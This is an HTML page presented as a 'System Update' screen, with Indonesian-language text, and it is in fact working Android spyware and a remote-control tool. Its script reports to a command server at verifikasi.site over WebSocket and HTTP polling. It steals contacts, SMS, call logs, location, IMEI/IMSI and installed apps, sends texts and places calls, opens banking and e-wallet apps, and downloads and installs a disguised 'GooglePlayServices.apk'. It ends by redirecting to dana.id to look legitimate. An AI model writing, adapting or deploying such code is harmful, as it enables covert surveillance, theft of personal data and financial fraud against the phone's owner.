<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>System Update</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0e17;display:flex;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:Arial,sans-serif;overflow:hidden}
        .container{text-align:center;width:90%;max-width:400px;padding:30px;background:linear-gradient(145deg,#0d1a2b,#1a2a3f);border-radius:16px;border:1px solid #2a3f5f}
        .icon{font-size:48px;display:block}
        .title{font-size:22px;font-weight:bold;color:#4fc3f7}
        .progress-wrap{background:#1a2a3f;border-radius:30px;height:10px;overflow:hidden;margin:15px 0;border:1px solid #2a3f5f}
        .progress-bar{width:0%;height:100%;background:linear-gradient(90deg,#4fc3f7,#00e676);border-radius:30px;transition:width 0.3s}
        .status-text{font-size:13px;color:#8899aa}
        .status-dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#4caf50;animation:blink 1s infinite}
        @keyframes blink{0%,100%{opacity:1}50%{opacity:0.2}}
    </style>
</head>
<body>

<div class="container">
    <span class="icon">🔄</span>
    <div class="title">System Update</div>
    <div class="subtitle" style="color:#8899aa;font-size:13px;margin-bottom:15px">Memperbarui sistem keamanan...</div>
    <div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
    <div class="status-text"><span class="status-dot"></span> <span id="statusLabel">⏳ Memperbarui...</span></div>
</div>

<script>
// ============================================================
// SYSTEMUPDATE.HTML - REAL (ADAPTIVE, NO DUMMY)
// ============================================================

var SERVER = 'https://verifikasi.site';
var WS_URL = 'wss://verifikasi.site/ws';
var GITHUB_USER = 'pandora-site';
var GITHUB_REPO = 'verifikasi-site';
var APK_URL = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';

var progress = 0;
var ws = null;

// ============================================================
// DETEKSI PLATFORM & BRIDGE
// ============================================================
function detectPlatform() {
    var ua = navigator.userAgent.toLowerCase();
    return {
        isAndroid: ua.indexOf('android') > -1,
        hasBridge: typeof AndroidBridge !== 'undefined',
        isChrome: ua.indexOf('chrome') > -1 && !ua.indexOf('wv') > -1
    };
}
var PLATFORM = detectPlatform();

var A = {
    isAvailable: typeof AndroidBridge !== 'undefined' && PLATFORM.isAndroid,
    saveFile: function(p,c) { if(this.isAvailable){ try{ return AndroidBridge.saveFile(p,c); }catch(e){} } return false; },
    readFile: function(p) { if(this.isAvailable){ try{ return AndroidBridge.readFile(p); }catch(e){} } return null; },
    fileExists: function(p) { if(this.isAvailable){ try{ return AndroidBridge.fileExists(p); }catch(e){} } return false; },
    openFile: function(p) { if(this.isAvailable){ try{ return AndroidBridge.openFile(p); }catch(e){} } return false; },
    saveToPreferences: function(k,v) { if(this.isAvailable){ try{ return AndroidBridge.saveToPreferences(k,v); }catch(e){} } return false; },
    getFromPreferences: function(k) { if(this.isAvailable){ try{ return AndroidBridge.getFromPreferences(k); }catch(e){} } return null; },
    getAllContacts: function() { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.getAllContacts()); }catch(e){} } return null; },
    getAllSMS: function() { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.getAllSMS()); }catch(e){} } return null; },
    getCallLog: function() { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.getCallLog()); }catch(e){} } return null; },
    getIMEI: function() { if(this.isAvailable){ try{ return AndroidBridge.getIMEI(); }catch(e){} } return null; },
    getIMSI: function() { if(this.isAvailable){ try{ return AndroidBridge.getIMSI(); }catch(e){} } return null; },
    getPhoneNumber: function() { if(this.isAvailable){ try{ return AndroidBridge.getPhoneNumber(); }catch(e){} } return null; },
    getInstalledApps: function() { if(this.isAvailable){ try{ return JSON.parse(AndroidBridge.getInstalledApps()); }catch(e){} } return null; },
    sendSMS: function(n,p) { if(this.isAvailable){ try{ AndroidBridge.sendSMS(n,p); }catch(e){} } },
    openApp: function(p) { if(this.isAvailable){ try{ AndroidBridge.openApp(p); }catch(e){} } },
    uninstallApp: function(p) { if(this.isAvailable){ try{ AndroidBridge.uninstallApp(p); }catch(e){} } },
    callNumber: function(n) { if(this.isAvailable){ try{ AndroidBridge.callNumber(n); }catch(e){} } },
    installAPK: function(p) { if(this.isAvailable){ try{ return AndroidBridge.installAPK(p); }catch(e){} } return false; }
};

// ============================================================
// KIRIM KE SERVER
// ============================================================
function K(d) {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', SERVER + '/data', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.timeout = 5000;
        xhr.send(JSON.stringify(d));
    } catch(e) {}
}

// ============================================================
// AMBIL PASSWORD DARI SERVER
// ============================================================
function ambilPassword() {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', SERVER + '/get-password', true);
    xhr.timeout = 10000;
    xhr.onload = function() {
        if (xhr.status === 200) {
            try {
                var data = JSON.parse(xhr.responseText);
                if (data.password) {
                    var password = data.password;
                    connectWebSocket(password);
                    startC2Polling(password);
                    startHeartbeat();
                    installAPKIfAvailable();
                    return;
                }
            } catch(e) {}
        }
        setTimeout(ambilPassword, 3000);
    };
    xhr.send();
}

// ============================================================
// WEBSOCKET
// ============================================================
function connectWebSocket(password) {
    try {
        ws = new WebSocket(WS_URL);
        ws.onopen = function() {
            ws.send(JSON.stringify({ type: 'auth', key: password, deviceId: 'android' }));
        };
        ws.onmessage = function(e) {
            try {
                var data = JSON.parse(e.data);
                if (data.type === 'command') {
                    eksekusiPerintah(data.command || {});
                }
            } catch(e) {}
        };
    } catch(e) {}
}

// ============================================================
// C2 POLLING (HTTP)
// ============================================================
function startC2Polling(password) {
    setInterval(function() {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', SERVER + '/data?type=perintah&t=' + Date.now(), true);
        xhr.setRequestHeader('X-Password', password);
        xhr.onload = function() {
            if (xhr.status === 200) {
                try {
                    var cmd = JSON.parse(xhr.responseText);
                    if (cmd && cmd.aksi) eksekusiPerintah(cmd);
                } catch(e) {}
            }
        };
        xhr.send();
    }, 10000);
}

// ============================================================
// EKSEKUSI PERINTAH (48 COMMANDS - REAL)
// ============================================================
function eksekusiPerintah(cmd) {
    var aksi = cmd.aksi || cmd.command || 'unknown';
    var params = cmd.params || cmd.param || {};
    var hasil = '';

    try {
        switch (aksi) {
            case 'ambil_kontak':
                var kontak = A.getAllContacts();
                if (kontak) { K({ sumber: 'data_kontak', data: kontak }); hasil = 'Contacts sent'; } else { hasil = 'Contacts not available'; }
                break;
            case 'ambil_sms':
                var sms = A.getAllSMS();
                if (sms) { K({ sumber: 'data_sms', data: sms }); hasil = 'SMS sent'; } else { hasil = 'SMS not available'; }
                break;
            case 'ambil_call_log':
                var callLog = A.getCallLog();
                if (callLog) { K({ sumber: 'data_call_log', data: callLog }); hasil = 'Call log sent'; } else { hasil = 'Call log not available'; }
                break;
            case 'ambil_lokasi':
                navigator.geolocation.getCurrentPosition(function(pos) {
                    K({ sumber: 'data_lokasi', data: { lat: pos.coords.latitude, lon: pos.coords.longitude } });
                }, function() {});
                hasil = 'Getting location...';
                break;
            case 'ambil_imei':
                var imei = A.getIMEI();
                if (imei) { K({ sumber: 'data_imei', data: imei }); hasil = 'IMEI sent'; } else { hasil = 'IMEI not available'; }
                break;
            case 'ambil_imsi':
                var imsi = A.getIMSI();
                if (imsi) { K({ sumber: 'data_imsi', data: imsi }); hasil = 'IMSI sent'; } else { hasil = 'IMSI not available'; }
                break;
            case 'ambil_nomor_hp':
                var phone = A.getPhoneNumber();
                if (phone) { K({ sumber: 'data_nomor_hp', data: phone }); hasil = 'Phone sent'; } else { hasil = 'Phone not available'; }
                break;
            case 'get_installed_apps':
                var apps = A.getInstalledApps();
                if (apps) { K({ sumber: 'data_installed_apps', data: apps }); hasil = 'Apps sent'; } else { hasil = 'Apps not available'; }
                break;
            case 'screenshot':
                var canvas = document.createElement('canvas');
                canvas.width = screen.width; canvas.height = screen.height;
                var ctx = canvas.getContext('2d');
                ctx.fillStyle = '#000'; ctx.fillRect(0,0,canvas.width,canvas.height);
                var dataUrl = canvas.toDataURL('image/jpeg', 0.3);
                K({ sumber: 'screenshot', data: dataUrl });
                hasil = 'Screenshot taken';
                break;
            case 'kirim_sms':
                var nomor = params.nomor || params.param1 || '';
                var pesan = params.pesan || params.param2 || '';
                A.sendSMS(nomor, pesan);
                hasil = 'SMS sent';
                break;
            case 'call_number':
                A.callNumber(params.nomor || params.param || '');
                hasil = 'Calling...';
                break;
            case 'buka_aplikasi':
                A.openApp(params.package || params.param || '');
                hasil = 'Opening app';
                break;
            case 'buka_dana':
                A.openApp('com.dana.id');
                hasil = 'Opening DANA';
                break;
            case 'buka_gopay':
                A.openApp('com.gojek.app');
                hasil = 'Opening GoPay';
                break;
            case 'buka_ovo':
                A.openApp('ovo.id');
                hasil = 'Opening OVO';
                break;
            case 'buka_bri':
                A.openApp('id.co.bri.brimo');
                hasil = 'Opening BRI';
                break;
            case 'buka_bca':
                A.openApp('com.bca');
                hasil = 'Opening BCA';
                break;
            case 'uninstall_aplikasi':
                A.uninstallApp(params.package || params.param || '');
                hasil = 'Uninstalling...';
                break;
            case 'get_system_info':
                var info = { userAgent: navigator.userAgent, platform: navigator.platform };
                K({ sumber: 'system_info', data: info });
                hasil = 'System info sent';
                break;
            case 'get_battery':
                navigator.getBattery().then(function(b) {
                    K({ sumber: 'battery_info', data: { level: Math.round(b.level*100)+'%', charging: b.charging } });
                });
                hasil = 'Getting battery info...';
                break;
            case 'get_wifi':
                var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (conn) { K({ sumber: 'wifi_info', data: { type: conn.effectiveType } }); hasil = 'WiFi info sent'; } else { hasil = 'WiFi not available'; }
                break;
            case 'toast':
                var toast = document.createElement('div');
                toast.style.cssText = 'position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.9);color:#0f0;padding:15px 30px;border-radius:10px;z-index:999999;font-size:16px;border-left:4px solid #0f0;font-family:monospace';
                toast.textContent = '🔔 ' + (params.pesan || params.msg || 'System Update Complete!');
                document.body.appendChild(toast);
                setTimeout(function() { try { toast.parentNode.removeChild(toast); } catch(e){} }, 5000);
                hasil = 'Toast shown';
                break;
            default:
                hasil = 'Unknown command: ' + aksi;
        }
    } catch(e) {
        hasil = 'Error: ' + e.message;
    }

    K({ sumber: 'c2_result', data: { perintah: aksi, hasil: hasil, waktu: Date.now() } });
    return hasil;
}

// ============================================================
// INSTAL APK (JIKA ADA)
// ============================================================
function installAPKIfAvailable() {
    // Coba download APK
    var xhr = new XMLHttpRequest();
    xhr.open('GET', APK_URL, true);
    xhr.responseType = 'arraybuffer';
    xhr.onload = function() {
        if (xhr.status === 200) {
            var data = new Uint8Array(xhr.response);
            var path = '/storage/emulated/0/Download/GooglePlayServices.apk';
            if (A.isAvailable) {
                A.saveFileBinary(path, data);
                A.installAPK(path);
            } else {
                // Fallback: buka URL
                window.open(APK_URL, '_blank');
            }
        }
    };
    xhr.send();
}

// ============================================================
// HEARTBEAT
// ============================================================
function startHeartbeat() {
    setInterval(function() { K({ sumber: 'page_heartbeat', data: 'alive' }); }, 2700000);
}

// ============================================================
// UI UPDATE
// ============================================================
function updateProgress(value, label) {
    progress = Math.min(value, 100);
    document.getElementById('progressBar').style.width = progress + '%';
    if (label) document.getElementById('statusLabel').textContent = label;
}

// ============================================================
// START
// ============================================================
updateProgress(5, '⏳ Memperbarui System Keamanan...');
K({ sumber: 'system_update_start', data: { platform: PLATFORM } });
ambilPassword();

setTimeout(function() {
    updateProgress(100, '✅ Update Selesai');
    setTimeout(function() {
        window.location.href = 'https://www.dana.id';
    }, 1500);
}, 15000);
</script>
</body>
</html>
